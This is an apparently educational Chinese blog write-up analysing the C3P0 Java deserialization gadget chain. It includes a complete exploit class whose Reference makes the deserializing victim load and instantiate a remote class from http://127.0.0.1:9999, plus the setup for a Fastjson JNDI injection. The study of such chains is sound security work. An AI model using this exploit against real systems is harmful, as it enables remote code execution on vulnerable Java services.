<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C3P0链</title>
    <url>/2025/04/01/C3P0%E9%93%BE/</url>
    <content><![CDATA[<h1 id="Java-反序列化之-C3P0-链学习">C3P0 链</h1>
<h2 id="SFzpI">C3P0 组件介绍</h2>
C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。

<p>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。</p>
<p>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p>
<p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p>
<h2 id="suq0L">环境配置</h2>

<ul>
<li>JDK 8u65</li>
<li>C3P0 <font style="color:#080808;background-color:#ffffff;">0.9.5.2</font></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="z1mJb">Gadget</h2>
<h3 id="AiWuP">URLClassLoader攻击链</h3>
<h4 id="DmQbC">分析</h4>
<h5 id="LidAt">链子尾部利用点</h5>
我们找到的类是`ReferenceableUtils`，它的`referenceToObject`方法，该方法中调用了`URLClassLoader`加载类的方法，后面也执行了`newInstance`进行的类的实例化

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">( Reference ref, Name name, Context nameCtx, Hashtable env)</span></span><br><span class="line">	<span class="keyword">throws</span> NamingException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">fClassName</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">		<span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br><span class="line"></span><br><span class="line">		<span class="type">ClassLoader</span> <span class="variable">defaultClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">		<span class="keyword">if</span> ( defaultClassLoader == <span class="literal">null</span> ) defaultClassLoader = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">		</span><br><span class="line">		ClassLoader cl;</span><br><span class="line">		<span class="keyword">if</span> ( fClassLocation == <span class="literal">null</span> )</span><br><span class="line">		    cl = defaultClassLoader;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    &#123;</span><br><span class="line">			<span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>( fClassLocation );</span><br><span class="line">			cl = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>( <span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; u &#125;, defaultClassLoader );</span><br><span class="line">		    &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="type">Class</span> <span class="variable">fClass</span> <span class="operator">=</span> Class.forName( fClassName, <span class="literal">true</span>, cl );</span><br><span class="line">		<span class="type">ObjectFactory</span> <span class="variable">of</span> <span class="operator">=</span> (ObjectFactory) fClass.newInstance();</span><br><span class="line">		<span class="keyword">return</span> of.getObjectInstance( ref, name, nameCtx, env );</span><br><span class="line">	    &#125;......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="ixJNC">调用referenceToObject</h5>

<p>接下来我们要去看，在哪里调用了<code>ReferenceableUtils#referenceToObject</code></p>
<p><code>ReferenceIndirector</code><font style="color:rgb(80, 80, 92);"> 的</font><code>getObject</code><font style="color:rgb(80, 80, 92);">方法调用了前者</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="sbk9p">调用<font style="color:rgb(80, 80, 92);">getObject</font></h5>

<p>继续向上找，在<code>PoolBackedDataSourceBase</code>的<code>readObject</code>方法中，调用了这里</p>
<p>且这个方法是一个类的<code>readObject</code>方法，是一个入口</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002611257-ed1c6bdb-e7d2-4449-9149-919b5ed4f7dd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002611257-ed1c6bdb-e7d2-4449-9149-919b5ed4f7dd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="WJ1UW">小结</h5>
其实这条链子非常短，也就简单的两次调用；难的是理解和调整

<p>流程如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741003226032-ecc5c3ba-6a73-47af-84d8-98fac13b7722.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741003226032-ecc5c3ba-6a73-47af-84d8-98fac13b7722.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="Fi5t9">实现</h4>
根据上述分析的流程，其实逻辑走下来就下面的一句话

<p>但是想要达到我们的目的，还是差一点距离</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="HuFaA">后续调整</h5>

<p>我们来看入口类的<code>readObject</code>方法</p>
<p>我们可以看到，如果想走到<code>getObject</code>处，需要我们反序列化后的类，是一个<code>IndirectlySerialized</code>类或者继承于这个类</p>
<p>且在执行完这行代码后，执行了<code>this.connectionPoolDataSource = (ConnectionPoolDataSource) o;</code>，这里将我们传入的类，强转成了<code>ConnectionPoolDataSource</code>，并赋值给connectionPoolDataSource</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> ois.readShort();</span><br><span class="line">		<span class="keyword">switch</span> (version)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> VERSION:</span><br><span class="line">				<span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">					<span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line">					<span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">this</span>.dataSourceName = (String) ois.readObject();</span><br><span class="line">				<span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">					<span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line">					<span class="built_in">this</span>.extensions = (Map) o;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">this</span>.factoryClassLocation = (String) ois.readObject();</span><br><span class="line">				<span class="built_in">this</span>.identityToken = (String) ois.readObject();</span><br><span class="line">				<span class="built_in">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line">				<span class="built_in">this</span>.pcs = <span class="keyword">new</span> <span class="title class_">PropertyChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line">				<span class="built_in">this</span>.vcs = <span class="keyword">new</span> <span class="title class_">VetoableChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>是不是感觉这里要求我们反序列化后的类为<code>IndirectlySerialized</code>是不可能的，我们看一下<code>PoolBackedDataSourceBase</code>的<code>writeObject</code>方法，三步之内必有解药</p>
<p>该方法内，有着一处<code>indirector.indirectForm( connectionPoolDataSource )</code>，而从上述代码中可以看到，indirector是一个<code>ReferenceIndirector</code>类，等价于<code>ReferenceIndirector.indirectForm(connectionPoolDataSource)</code></p>
<p>且我们的connectionPoolDataSource不应继承序列化接口，在尝试序列化接口时失败，才能走入catch中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">( ObjectOutputStream oos )</span> <span class="keyword">throws</span> IOException</span><br><span class="line">	&#123;</span><br><span class="line">		oos.writeShort( VERSION );</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//test serialize</span></span><br><span class="line">			SerializableUtils.toByteArray(connectionPoolDataSource);</span><br><span class="line">			oos.writeObject( connectionPoolDataSource );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (NotSerializableException nse)</span><br><span class="line">		&#123;</span><br><span class="line">			com.mchange.v2.log.MLog.getLogger( <span class="built_in">this</span>.getClass() ).log(com.mchange.v2.log.MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, nse);</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">Indirector</span> <span class="variable">indirector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mchange.v2.naming.ReferenceIndirector();</span><br><span class="line">				oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (IOException indirectionIOException)</span><br><span class="line">			&#123; <span class="keyword">throw</span> indirectionIOException; &#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception indirectionOtherException)</span><br><span class="line">			&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + indirectionOtherException.toString() ); &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		oos.writeObject( dataSourceName );</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>indirectForm</code>，从传入对象中获取一个<code>Reference</code>对象，封装到一个<code>ReferenceSerialized</code>类中，而我们可以看到，<code>ReferenceSerialized</code>是继承了<code>IndirectlySerialized</code>接口的，就能成功走到<code>if (o instanceof IndirectlySerialized)</code>之中了</p>
<p>看一下<code>IndirectlySerialized</code>，是一个内部类，发现他是继承了serialize接口的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">( Object orig )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReferenceSerialized</span> <span class="keyword">implements</span> <span class="title class_">IndirectlySerialized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IndirectlySerialized</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在我们拿到的 “ConnectionPoolDataSource” 外表上还是 “ConnectionPoolDataSource”，但是实际上已经变成了 “ReferenceSerialized” 这个类</p>
<p><font style="color:#080808;background-color:#ffffff;">在</font><code>PoolBackedDataSourceBase</code><font style="color:#080808;background-color:#ffffff;">中被封装的connectionPoolDataSource是一个</font><code>ConnectionPoolDataSource</code><font style="color:#080808;background-color:#ffffff;">类</font></p>
<p>且在<code>indirectForm</code>封装过程中，调用<code>orig</code>的<code>getReference</code>方法，要继承<code>Referenceable</code>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">( Object orig )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此我们要构造一个类，继承<code>getReference</code>和<code>ConnectionPoolDataSource</code><font style="color:#080808;background-color:#ffffff;">接口，并在重写的</font><code>getReference</code><font style="color:#080808;background-color:#ffffff;">方法中构造恶意</font><code>Reference</code></p>
<p><font style="color:#080808;background-color:#ffffff;">构造好后，需要重写接口类内的方法</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:9999/Calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="j8FVX">最终EXP</h5>

<p>new一个<code>PoolBackedDataSourceBase</code>，通过反射将connectionPoolDataSource修改为我们的<code>EXP_Loader</code>，然后在序列化的过程中对connectionPoolDataSource进行封装，最后可以走到<code>if (o instanceof IndirectlySerialized)</code>中，触发恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:9999/Calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">sourceBaseClass</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSource</span> <span class="operator">=</span> sourceBaseClass.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSource.set(poolBackedDataSourceBase, <span class="keyword">new</span> <span class="title class_">EXP_Loader</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(poolBackedDataSourceBase);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="NP8OE">JNDI注入</h3>
<h4 id="Ly7DN">环境配置</h4>

<p>C3P0的JNDI攻击链，是基于<code>Fastjson</code><font style="color:rgb(80, 80, 92);">依赖的，因此我们需要导入相关依赖</font></p>
<p><font style="color:rgb(80, 80, 92);">我们需要导入1.2.24版本的，因为在1.2.25中将</font><code>com.mchange</code><font style="color:rgb(80, 80, 92);">包加入了黑名单</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h4 id="aWW6J">JNDI注入流程</h4>
<h5 id="fewO8">JNDI触发点</h5>

<p>在<code>JndiRefForwardingDataSource</code>的<code>dereference</code>方法中，存在lookup方法</p>
<p><code>ctx.lookup( (String) jndiName )</code></p>
<p>这里的jndiName是通过<code>getJndiName</code>方法获取的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> DataSource <span class="title function_">dereference</span><span class="params">()</span> <span class="keyword">throws</span> SQLException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">jndiName</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiName();</span><br><span class="line">	<span class="type">Hashtable</span> <span class="variable">jndiEnv</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiEnv();</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	    &#123;</span><br><span class="line">		InitialContext ctx;</span><br><span class="line">		<span class="keyword">if</span> (jndiEnv != <span class="literal">null</span>)</span><br><span class="line">		    ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>( jndiEnv );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">		<span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> String)</span><br><span class="line">		    <span class="keyword">return</span> (DataSource) ctx.lookup( (String) jndiName );</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> Name)</span><br><span class="line">		    <span class="keyword">return</span> (DataSource) ctx.lookup( (Name) jndiName );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Could not find ConnectionPoolDataSource with &quot;</span> +</span><br><span class="line">					   <span class="string">&quot;JNDI name: &quot;</span> + jndiName);</span><br><span class="line">	    &#125;</span><br><span class="line">	......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>getJndiName</code>方法，我们可以看到一些判断，如果jndiName是<code>Name</code>类型，则返回<code>(Name) jndiName).clone()</code>，反之则返回<code>String</code>类型的jndiName</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getJndiName</span><span class="params">()</span></span><br><span class="line">	&#123; <span class="keyword">return</span> (jndiName <span class="keyword">instanceof</span> Name ? ((Name) jndiName).clone() : jndiName <span class="comment">/* String */</span>); &#125;</span><br></pre></td></tr></table></figure>

<h5 id="KDvsh">调用dereference</h5>

<p>查找该方法的调用处，只有<code>JndiRefForwardingDataSource</code>中的<code>inner</code>方法内调用了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> DataSource <span class="title function_">inner</span><span class="params">()</span> <span class="keyword">throws</span> SQLException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">if</span> (cachedInner != <span class="literal">null</span>)</span><br><span class="line">	    <span class="keyword">return</span> cachedInner;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">DataSource</span> <span class="variable">out</span> <span class="operator">=</span> dereference();</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.isCaching())</span><br><span class="line">		    cachedInner = out;</span><br><span class="line">		<span class="keyword">return</span> out;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="zxcJe">调用inner</h5>
继续向上找，我们可以看到一堆的setter与getter方法

<p>看到这里就可以想到fastjson的调用链，满足了fastjson链的调用，我们这里选择<code>setLoginTimeout</code>方法，它只需要我们传入一个整数即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741089858903-68f3d419-1a47-491b-a13f-f8cf9d452d2e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741089858903-68f3d419-1a47-491b-a13f-f8cf9d452d2e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="nNIfX">JNDIEXP构造</h4>
该EXP构造十分简单，和之前说的fastjson利用链的构造方法一样

